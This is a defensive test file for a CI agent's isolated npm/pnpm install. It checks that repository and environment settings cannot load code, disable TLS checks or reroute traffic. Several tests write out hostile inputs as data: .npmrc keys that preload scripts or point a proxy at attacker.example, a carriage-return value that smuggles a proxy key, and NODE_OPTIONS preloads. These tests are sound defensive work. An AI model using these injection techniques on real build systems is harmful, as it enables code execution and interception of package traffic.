import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { execFile, execFileSync } from 'node:child_process';
import { existsSync } from 'node:fs';
import { createServer, type AddressInfo } from 'node:net';
import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { promisify } from 'node:util';
import { PackageManager } from '@kici-dev/shared/package-manager';
import { HostInstallRefusal, checkHostInstallEligibility } from './host-install-eligibility.js';
import type { HostInstallPlan } from './host-install-eligibility.js';
import {
  NpmInstallCommand,
  PINNED_PNPM_VERSION,
  buildHostInstallArgs,
  buildHostInstallEnv,
  buildHostNpmrc,
  npmInstallCommand,
  resolveHostNpm,
  resolvePinnedPnpm,
  runHostIsolatedInstall,
  versionAtLeast,
  type HostInstallTool,
} from './host-isolated-install.js';
import {
  isOperatorNpmrcKey,
  isRepoNpmrcKey,
  loadNpmIni,
  pickAllowed,
  type IniCodec,
} from './npmrc-allowlist.js';

const ini = loadNpmIni();
const execFileAsync = promisify(execFile);

/** The `.npmrc` part of a plan, picked from file texts the way the eligibility check picks it. */
function npmrcFrom(codec: IniCodec, repoText: string, operatorText = ''): HostInstallPlan['npmrc'] {
  return {
    ini: codec,
    operator: pickAllowed(codec.decode(operatorText), isOperatorNpmrcKey),
    repo: pickAllowed(codec.decode(repoText), isRepoNpmrcKey),
  };
}

const REGISTRY = {
  url: 'https://npm.acme.internal/',
  scope: '@acme',
  alwaysAuth: false,
  token: 'tok-123',
};

describe.skipIf(!ini)('buildHostNpmrc', () => {
  const codec = ini!;

  it('writes only allowlisted repository pairs and drops every code-loading key', () => {
    const repoNpmrc = [
      '@acme:registry=https://npm.acme.internal/',
      '//npm.acme.internal/:_authToken=${ACME_TOKEN}',
      'strict-ssl=false',
      'node-options=--require ./evil.cjs',
      'git=./evil.sh',
      'script-shell=./evil.sh',
      'pnpmfile=./hooks.cjs',
      'onload-script=./evil.cjs',
      'proxy=http://attacker.example:8080',
      'cafile=/etc/shadow',
    ].join('\n');

    const { text } = buildHostNpmrc({
      npmrc: npmrcFrom(codec, repoNpmrc),
      registries: [],
      installEnvSecrets: {},
      jobIdShort: 'job12345',
    });

    // fails-when: the config is built from a denylist (or copied as-is), so a
    // repository key that loads code, disables TLS checks or reroutes traffic
    // reaches the host install.
    expect(codec.decode(text)).toEqual({
      '@acme:registry': 'https://npm.acme.internal/',
      '//npm.acme.internal/:_authToken': '${ACME_TOKEN}',
    });
  });

  it('writes operator TLS and proxy pairs, then the agent block last', () => {
    const { text, env } = buildHostNpmrc({
      npmrc: npmrcFrom(
        codec,
        'registry=https://registry.example/',
        'proxy=http://proxy.corp:3128\ncafile=/etc/ssl/corp.pem\nnode-options=--x',
      ),
      registries: [REGISTRY],
      installEnvSecrets: {},
      jobIdShort: 'job12345',
    });
    // breaks-if-wrong: the operator's own proxy and CA file still apply.
    expect(codec.decode(text)).toMatchObject({
      proxy: 'http://proxy.corp:3128',
      cafile: '/etc/ssl/corp.pem',
      registry: 'https://registry.example/',
    });
    expect(text).not.toContain('node-options');
    // The managed registry line comes last so npm's last-wins picks it.
    expect(text.trim().split('\n').at(-1)).toBe(
      '//npm.acme.internal/:_authToken=${KICI_NPM_TOKEN_job12345_0}',
    );
    expect(env).toEqual({ KICI_NPM_TOKEN_job12345_0: 'tok-123' });
  });

  it('passes an install secret only under a name a kept auth value references', () => {
    const { env } = buildHostNpmrc({
      npmrc: npmrcFrom(
        codec,
        [
          '//r.example/:_authToken=${MY_TOKEN}',
          '//r2.example/:_password=${DASH_STYLE-fallback}',
          '//r3.example/:_authToken=${NODE_OPTIONS}',
          '//r4.example/:username=${HTTPS_PROXY}',
          'registry=https://r.example/${REG_PATH}/',
          'node-options=${OTHER}',
        ].join('\n'),
      ),
      registries: [],
      installEnvSecrets: {
        MY_TOKEN: 'secret-1',
        DASH_STYLE: 'secret-2',
        UNREFERENCED: 'secret-3',
        OTHER: 'secret-4',
        REG_PATH: 'secret-5',
        NODE_OPTIONS: '--require /evil.cjs',
        HTTPS_PROXY: 'http://attacker.example:8080',
      },
      jobIdShort: 'job12345',
    });
    // fails-when: an install secret named NODE_OPTIONS or HTTPS_PROXY reaches
    // the install env (preloading code, or routing the install through the
    // workflow's proxy), or a secret referenced only by a registry value or a
    // dropped key is passed.
    // breaks-if-wrong: a secret an auth value references — in npm's `${NAME}`
    // or pnpm's `${NAME-default}` form — still reaches the install.
    expect(env).toEqual({ MY_TOKEN: 'secret-1', DASH_STYLE: 'secret-2' });
  });

  it('passes install secrets named NPM_TOKEN and NODE_AUTH_TOKEN that auth values reference', () => {
    const { env } = buildHostNpmrc({
      npmrc: npmrcFrom(
        codec,
        [
          '//r.example/:_authToken=${NPM_TOKEN?}',
          '//r2.example/:_authToken=${NODE_AUTH_TOKEN}',
          '//r3.example/:_authToken=${NPM_CONFIG_USERCONFIG}',
        ].join('\n'),
      ),
      registries: [],
      installEnvSecrets: {
        NPM_TOKEN: 'secret-1',
        NODE_AUTH_TOKEN: 'secret-2',
        NPM_CONFIG_USERCONFIG: '/tmp/evil-npmrc',
      },
      jobIdShort: 'job12345',
    });
    // fails-when: the exempt names are dropped as tool-read, so the install runs
    // on the host without the token its .npmrc references.
    // breaks-if-wrong: a name npm reads as config is still never passed.
    expect(env).toEqual({ NPM_TOKEN: 'secret-1', NODE_AUTH_TOKEN: 'secret-2' });
  });

  it('writes a fresh file: a lone-CR line is never copied into it', () => {
    const payload =
      'registry=https://registry.npmjs.org/\rhttps-proxy=http://attacker.example:8080/\n';
    // Positive control: npm's parser reads the smuggled key out of these bytes.
    expect(codec.decode(payload)['https-proxy']).toBe('http://attacker.example:8080/');
    // Even from pairs parsed out of such a file, the written config holds only
    // the allowlisted one.
    const { text } = buildHostNpmrc({
      npmrc: npmrcFrom(codec, payload),
      registries: [],
      installEnvSecrets: {},
      jobIdShort: 'job12345',
    });
    // fails-when: the file is assembled from source lines, so the CR and the
    // key behind it are written through.
    expect(text).not.toMatch(/\r|https-proxy/);
    expect(codec.decode(text)).toEqual({ registry: 'https://registry.npmjs.org/' });
  });
});

describe('buildHostInstallEnv', () => {
  it('carries no NODE_OPTIONS, npm_config_* or pnpm_config_*, and points HOME into the stage', () => {
    const env = buildHostInstallEnv({
      baseEnv: {
        PATH: '/usr/bin',
        LANG: 'C.UTF-8',
        HOME: '/home/agent',
        NODE_OPTIONS: '--require /evil.cjs',
        npm_config_git: '/evil.sh',
        NPM_CONFIG_SCRIPT_SHELL: '/evil.sh',
        pnpm_config_pnpmfile: '/evil.cjs',
        COREPACK_ENABLE_STRICT: '0',
      },
      nodeDir: '/opt/node/bin',
      stageHome: '/stage/home',
      extra: { KICI_NPM_TOKEN_x_0: 't' },
    });
    // fails-when: the agent's environment is passed through wholesale.
    expect(
      Object.keys(env).filter((k) => /^(node_options|npm_config_|pnpm_config_|corepack)/i.test(k)),
    ).toEqual([]);
    expect(env.HOME).toBe('/stage/home');
    expect(env.XDG_CONFIG_HOME).toBe('/stage/home/.config');
    expect(env.PATH).toBe('/opt/node/bin:/usr/bin');
    // breaks-if-wrong: locale and the registry token var still pass.
    expect(env.LANG).toBe('C.UTF-8');
    expect(env.KICI_NPM_TOKEN_x_0).toBe('t');
  });
});

describe('buildHostInstallArgs', () => {
  const stage = { cache: '/s/cache', store: '/s/store', userconfig: '/s/home/.npmrc' };

  it('npm refuses git, and every non-registry source when the npm supports it', () => {
    const tool: HostInstallTool = {
      packageManager: PackageManager.Npm,
      nodeExe: '/n/node',
      script: '/n/npm-cli.js',
      version: '11.19.1',
    };
    const argv = buildHostInstallArgs(tool, stage);
    // breaks-if-wrong: npm 11.15.0 and later keeps `npm install`, which runs
    // without a lockfile.
    expect(argv[1]).toBe(NpmInstallCommand.Install);
    expect(argv).toEqual(
      expect.arrayContaining([
        '--ignore-scripts',
        '--allow-git=none',
        '--allow-remote=none',
        '--allow-file=none',
        '--allow-directory=none',
      ]),
    );
    // Before 11.15.0 npm has --allow-git only; unknown flags would be ignored.
    const older = buildHostInstallArgs({ ...tool, version: '11.12.1' }, stage);
    // fails-when: an npm without --allow-remote runs `npm install`, which
    // resolves a registry package's own URL dependency from the agent host.
    expect(older[1]).toBe(NpmInstallCommand.Ci);
    expect(older).toContain('--allow-git=none');
    expect(older).toContain('--ignore-scripts');
    expect(older).not.toContain('--allow-remote=none');
  });

  it.each([
    ['11.10.0', NpmInstallCommand.Ci],
    ['11.14.9', NpmInstallCommand.Ci],
    ['11.15.0', NpmInstallCommand.Install],
    ['12.0.0', NpmInstallCommand.Install],
  ] as const)('npm %s runs npm %s', (version, command) => {
    expect(npmInstallCommand(version)).toBe(command);
  });

  it('pnpm disables hooks, workspace discovery and version switching', () => {
    const argv = buildHostInstallArgs(
      {
        packageManager: PackageManager.Pnpm,
        nodeExe: '/n/node',
        script: '/c/pnpm.cjs',
        version: PINNED_PNPM_VERSION,
      },
      stage,
    );
    expect(argv).toEqual(
      expect.arrayContaining([
        '--ignore-scripts',
        '--ignore-pnpmfile',
        '--ignore-workspace',
        '--pm-on-fail=ignore',
        '--config.runtime-on-fail=ignore',
        '--config.block-exotic-subdeps=true',
        '--config.enable-global-virtual-store=false',
      ]),
    );
  });
});

describe('versionAtLeast', () => {
  it.each([
    ['11.10.0', [11, 10, 0], true],
    ['11.9.9', [11, 10, 0], false],
    ['12.0.0', [11, 15, 0], true],
    ['11.15.0-pre.1', [11, 15, 0], true],
    ['10.99.0', [11, 10, 0], false],
  ] as const)('%s >= %j is %s', (version, min, expected) => {
    expect(versionAtLeast(version, min)).toBe(expected);
  });
});

describe('resolvePinnedPnpm', () => {
  let dir: string;
  beforeEach(async () => {
    dir = await mkdtemp(join(tmpdir(), 'kici-corepack-'));
  });
  afterEach(async () => {
    await rm(dir, { recursive: true, force: true });
  });

  async function seed(version: string): Promise<void> {
    const pkg = join(dir, 'v1', 'pnpm', PINNED_PNPM_VERSION);
    await mkdir(join(pkg, 'bin'), { recursive: true });
    await writeFile(join(pkg, 'bin', 'pnpm.cjs'), '');
    await writeFile(join(pkg, 'package.json'), JSON.stringify({ name: 'pnpm', version }));
  }

  it('resolves the pinned bundle from COREPACK_HOME', async () => {
    await seed(PINNED_PNPM_VERSION);
    const tool = await resolvePinnedPnpm({ COREPACK_HOME: dir }, '/nonexistent');
    expect(tool?.script).toBe(join(dir, 'v1', 'pnpm', PINNED_PNPM_VERSION, 'bin', 'pnpm.cjs'));
    expect(tool?.nodeExe).toBe(process.execPath);
  });

  it('refuses a cache directory whose package.json names another version', async () => {
    await seed('9.0.0');
    // fails-when: the directory name is trusted instead of the bundle's own version.
    expect(await resolvePinnedPnpm({ COREPACK_HOME: dir }, '/nonexistent')).toBeNull();
  });
});

const npmTool = await resolveHostNpm();
const pnpmTool = await resolvePinnedPnpm();

/**
 * Real installs against the agent's own npm and the pinned pnpm, on projects
 * with no dependencies (no network). Each case has a positive control: the
 * same hostile file, used by the same package manager run the ordinary way in
 * the checkout, does execute — so the host path's clean result is not a
 * vector that could never fire.
 */
describe('runHostIsolatedInstall — real package managers', () => {
  let root: string;
  let kici: string;
  let marker: string;
  beforeEach(async () => {
    root = await mkdtemp(join(tmpdir(), 'kici-host-install-'));
    kici = join(root, '.kici');
    marker = join(root, 'MARKER');
    await mkdir(kici);
  });
  afterEach(async () => {
    await rm(root, { recursive: true, force: true });
  });

  it.skipIf(!npmTool)(
    `npm ${npmTool?.version ?? '(unavailable)'}: a repository git= setting and a git dependency never run on the host`,
    async () => {
      const evilGit = join(kici, 'evil-git.sh');
      await writeFile(evilGit, `#!/bin/sh\necho ran > ${marker}\nexit 1\n`, { mode: 0o755 });
      const repoNpmrc = `git=${evilGit}\n`;
      await writeFile(join(kici, '.npmrc'), repoNpmrc);
      const dependencies = { dep: 'git+https://example.invalid/dep.git' };
      await writeFile(
        join(kici, 'package.json'),
        JSON.stringify({ name: 'k', private: true, dependencies }),
      );
      // A lockfile that pins the git dependency, so both npm install and the
      // npm ci an older npm runs reach its fetch.
      await writeFile(
        join(kici, 'package-lock.json'),
        JSON.stringify({
          name: 'k',
          lockfileVersion: 3,
          requires: true,
          packages: {
            '': { name: 'k', dependencies },
            'node_modules/dep': {
              version: '1.0.0',
              resolved: `${dependencies.dep}#0123456789abcdef0123456789abcdef01234567`,
            },
          },
        }),
      );

      // The eligibility check refuses this project; the installer itself must
      // hold even when called directly: --allow-git=none refuses the fetch and
      // the repository's .npmrc is never the config npm reads. The error must
      // name the git refusal: one raised before the fetch (a missing lockfile,
      // say) would leave the flag untested.
      await expect(
        runHostIsolatedInstall({
          kiciDir: kici,
          plan: {
            packageManager: PackageManager.Npm,
            lockfile: 'package-lock.json',
            registries: [],
            npmrc: npmrcFrom(ini!, repoNpmrc),
          },
          tool: npmTool!,
          registries: [],
          installEnvSecrets: {},
          jobIdShort: 'job12345',
          baseEnv: { PATH: process.env.PATH },
        }),
      ).rejects.toThrow(/EALLOWGIT/);
      // fails-when: the install runs in the checkout or without --allow-git=none,
      // so npm spawns the repository's git= program to fetch the dependency.
      expect(existsSync(marker)).toBe(false);

      // Positive control: npm run in the checkout the ordinary way (scripts
      // disabled) spawns it.
      try {
        execFileSync(
          npmTool!.nodeExe,
          [npmTool!.script, 'install', '--ignore-scripts', '--no-audit'],
          {
            cwd: kici,
            stdio: 'pipe',
            env: { PATH: process.env.PATH!, HOME: root },
          },
        );
      } catch {
        // The fetch fails after the program ran.
      }
      expect(existsSync(marker)).toBe(true);
    },
    120_000,
  );

  it.skipIf(!npmTool)(
    'npm: a lone CR smuggles a key into npm through a raw-line copy, and the host path refuses the file',
    async () => {
      const payload =
        'registry=https://registry.npmjs.org/\rhttps-proxy=http://attacker.example:8080/\n';
      // Positive control: a LF-only line filter keeps the line (its key is
      // registry), and npm itself reads the proxy out of the copied bytes.
      const rawCopy = payload
        .split(/\r?\n/)
        .filter((line) => line.includes('=') && isRepoNpmrcKey(line.slice(0, line.indexOf('='))))
        .join('\n');
      const copied = join(root, 'copied.npmrc');
      await writeFile(copied, rawCopy);
      const proxy = execFileSync(
        npmTool!.nodeExe,
        [npmTool!.script, 'config', 'get', 'https-proxy', '--userconfig', copied],
        { cwd: root, encoding: 'utf-8', env: { PATH: process.env.PATH!, HOME: root } },
      );
      expect(proxy.trim()).toBe('http://attacker.example:8080/');

      await writeFile(join(kici, 'package.json'), JSON.stringify({ name: 'k', private: true }));
      await writeFile(join(kici, '.npmrc'), payload);
      // fails-when: the file is accepted, so its lines can reach the install.
      expect(await checkHostInstallEligibility(root, { operatorNpmrc: null })).toMatchObject({
        eligible: false,
        refusal: HostInstallRefusal.UnsafeNpmrc,
      });
    },
    120_000,
  );

  it.skipIf(!npmTool)(
    'npm: positive control: the real npm sends registry requests through HTTP_PROXY from its environment',
    async () => {
      const requestLines: string[] = [];
      const proxy = createServer((socket) => {
        // npm may reset the connection once it has read the 404.
        socket.on('error', () => {});
        socket.once('data', (chunk) => {
          requestLines.push(chunk.toString('latin1').split('\r\n')[0]!);
          socket.end('HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\nConnection: close\r\n\r\n');
        });
      });
      await new Promise<void>((resolve) => proxy.listen(0, '127.0.0.1', resolve));
      const { port } = proxy.address() as AddressInfo;
      try {
        await execFileAsync(
          npmTool!.nodeExe,
          [
            npmTool!.script,
            'view',
            'kici-proxy-probe',
            '--registry',
            'http://registry.invalid/',
            '--userconfig',
            join(root, '.npmrc'),
            '--cache',
            join(root, 'cache'),
            '--fetch-retries',
            '0',
          ],
          {
            cwd: root,
            env: { PATH: process.env.PATH!, HOME: root, HTTP_PROXY: `http://127.0.0.1:${port}` },
          },
        ).catch(() => {
          // The proxy answers 404, so npm exits non-zero after the request.
        });
      } finally {
        proxy.close();
      }
      // A `.invalid` host never resolves, so the request reaching this socket
      // came through the variable: an install secret under that name, which
      // buildHostNpmrc keeps out of the install env, would reroute the install.
      expect(requestLines.some((line) => line.includes('registry.invalid'))).toBe(true);
    },
    120_000,
  );

  it.skipIf(!npmTool)(
    'npm: NODE_OPTIONS and npm_config_* from the agent environment never reach the install',
    async () => {
      const evil = join(kici, 'evil.cjs');
      await writeFile(evil, `require('fs').writeFileSync(${JSON.stringify(marker)}, 'ran')\n`);
      await writeFile(join(kici, 'package.json'), JSON.stringify({ name: 'k', private: true }));
      await writeFile(
        join(kici, 'package-lock.json'),
        JSON.stringify({ name: 'k', lockfileVersion: 3, requires: true, packages: { '': {} } }),
      );

      await runHostIsolatedInstall({
        kiciDir: kici,
        plan: {
          packageManager: PackageManager.Npm,
          lockfile: 'package-lock.json',
          registries: [],
          npmrc: npmrcFrom(ini!, ''),
        },
        tool: npmTool!,
        registries: [],
        installEnvSecrets: {},
        jobIdShort: 'job12345',
        baseEnv: {
          PATH: process.env.PATH,
          NODE_OPTIONS: `--require ${evil}`,
          npm_config_node_options: `--require ${evil}`,
        },
      });

      // fails-when: the agent environment is passed through, so NODE_OPTIONS
      // preloads evil.cjs into the npm process.
      expect(existsSync(marker)).toBe(false);
      // breaks-if-wrong: a clean project still installs and yields node_modules.
      expect(existsSync(join(kici, 'node_modules'))).toBe(true);

      // Positive control: the same variable preloads it into npm.
      execFileSync(npmTool!.nodeExe, [npmTool!.script, '--version'], {
        cwd: kici,
        stdio: 'pipe',
        env: { PATH: process.env.PATH!, HOME: root, NODE_OPTIONS: `--require ${evil}` },
      });
      expect(existsSync(marker)).toBe(true);
    },
    120_000,
  );

  it.skipIf(!pnpmTool || !ini)(
    `pnpm ${PINNED_PNPM_VERSION}: a pnpmfile and a packageManager pin never take effect on the host`,
    async () => {
      await writeFile(
        join(kici, 'package.json'),
        JSON.stringify({ name: 'k', private: true, packageManager: 'pnpm@9.0.0' }),
      );
      await writeFile(
        join(kici, '.pnpmfile.cjs'),
        `require('fs').writeFileSync(${JSON.stringify(marker)}, 'ran'); module.exports = { hooks: {} };\n`,
      );

      await runHostIsolatedInstall({
        kiciDir: kici,
        plan: {
          packageManager: PackageManager.Pnpm,
          lockfile: null,
          registries: [],
          npmrc: npmrcFrom(ini!, ''),
        },
        tool: pnpmTool!,
        registries: [],
        installEnvSecrets: {},
        jobIdShort: 'job12345',
        baseEnv: { PATH: process.env.PATH },
      });

      // fails-when: pnpm runs in the checkout (or without --ignore-pnpmfile) and
      // loads .pnpmfile.cjs, or follows packageManager to a downloaded pnpm.
      expect(existsSync(marker)).toBe(false);
      expect(existsSync(join(kici, 'node_modules'))).toBe(true);

      // Positive control: the same pnpm run in the checkout loads the pnpmfile.
      try {
        execFileSync(pnpmTool!.nodeExe, [pnpmTool!.script, 'install', '--pm-on-fail=ignore'], {
          cwd: kici,
          stdio: 'pipe',
          env: { PATH: process.env.PATH!, HOME: root },
        });
      } catch {
        // The install itself may fail offline; loading the pnpmfile comes first.
      }
      expect(existsSync(marker)).toBe(true);
    },
    120_000,
  );
});
